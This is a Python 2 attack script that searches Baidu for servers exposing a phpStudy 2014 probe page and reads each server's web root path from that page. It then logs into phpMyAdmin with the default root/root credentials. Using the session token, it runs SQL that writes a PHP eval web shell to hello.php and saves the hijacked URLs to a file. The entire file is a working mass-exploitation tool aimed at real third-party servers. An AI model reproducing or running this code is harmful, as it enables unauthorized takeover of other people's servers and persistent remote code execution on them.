# coding=utf-8
import urllib2
import string
import urllib
import re
import cookielib 
import sys
import socket

def get_res_list_and_next_page_url(target_url):
    res = urllib2.urlopen(target_url)
    html=res.read()
    content = unicode(html, 'utf-8','ignore')
    pattern = re.compile(r'<div class="f13">(.*?)</span>')
    resList = pattern.findall(html)
    res_lists = resList

    #获取next_page_url
    pattern = re.compile(r'<div id="page".*?</div>')
    m = pattern.search(html)
    next_page_url = ''
    if m:
        t = m.group()
        pattern = re.compile(r'</strong><a href="(.*?)">')
        mm = pattern.search(t)
        tt = mm.group(1)
        next_page_url = 'http://www.baidu.com'+tt
    return res_lists,next_page_url

def get_url(div_data):
    pattern = re.compile(r'<span class="g">(.*?)&nbsp;')
    mm = pattern.search(div_data)
    if mm:
        url = mm.group(1)
        return url

if __name__ == "__main__":
    #初始化
    keyword = "phpStudy%20探针%202014"
    url = 'http://www.baidu.com/s?wd=' + keyword + '&rsv_bp=0&rsv_spt=3&rsv_n=2&inputT=6391'
    target_urls = []
    target_urls.append(url)

    page_num = 50 #想多少页就多少页。。只要你有。。

    for cnt in range(page_num):
        if target_urls[cnt] == "END_FLAG":
            break
        res_lists,next_page_url = get_res_list_and_next_page_url(target_urls[cnt])
        if next_page_url: #考虑没有“下一页”的情况
            target_urls.append(next_page_url)
        else:
            target_urls.append("END_FLAG")

        urls = []
  
        for index in range(len(res_lists)):
            socket.setdefaulttimeout(20)
            url = get_url(res_lists[index])
            urls.append(url)
            print url

            try:
                php_page = urllib2.urlopen("http://"+url)
                php_html=php_page.read()
                path_search = re.compile(r'<td>绝对路径</td>[\s\S]*?<td>(.*?)</td>')
                path_group = path_search.search(php_html)
                if path_group:            
                    path = path_group.group(1)
            except:
                print "Something is wrong"
                continue

            cookies = cookielib.LWPCookieJar()
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookies)) 
            headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
            params = urllib.urlencode({'pma_username': 'root', 'pma_password': 'root'})
            request = urllib2.Request("http://"+url+"phpmyadmin/index.php", params,headers)
            try:
                response = opener.open(request)
            except:
                print "Something is wrong!"
                continue
            if response:
                a=response.read()
                pattern = re.compile(r'<p>phpMyAdmin is more friendly with a')
                judge = pattern.search(a)
                if judge != None:
                    token_find = re.compile(r"token = '(.*?)';")
                    token_group = token_find.search(a)
                    token = token_group.group(1)
                    
                    f_u=file("url_OK.txt","a+")
                    f_u.write(url)
                    f_u.write("\r\n")
                    f_u.close()

                    if path:
                        path = path+'/hello.php'
                        sql = ["Drop TABLE IF EXISTS xbclub;","Create TABLE xbclub(cmd text NOT NULL);","Insert INTO xbclub (cmd) VALUES('<?php @eval($_POST[123])?>');","Select cmd from xbclub into outfile '"+path+"';","Drop TABLE IF EXISTS xbclub;"]
                        exp_headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
                        success_num = 0
                        for sql_cmd in sql:
                            exp = urllib.urlencode({'is_js_confirmed':'1', 'db':'test', 'token':token, 'sql_query':sql_cmd,'ajax_request':'true'})
                            exp_request = urllib2.Request("http://"+url+"phpmyadmin/import.php", exp, exp_headers)
                            try:
                                exp_response = opener.open(exp_request)
                            except:
                                print "Something is wrong!"
                                continue
                        
                        try:
                            f_g=file("shell_might.txt","a+")
                            f_g.write(url)
                            f_g.write("\r\n")
                            f_g.close()
                            res = urllib2.urlopen('http://'+url+'hello.php')
                        except urllib2.HTTPError,e:
                            if e.code==404:
                                print "write Eror!"
                                continue
                        f=file("shell.txt","a+")
                        f.write(url+'hello.php')
                        f.write("\r\n")
                        f.close()
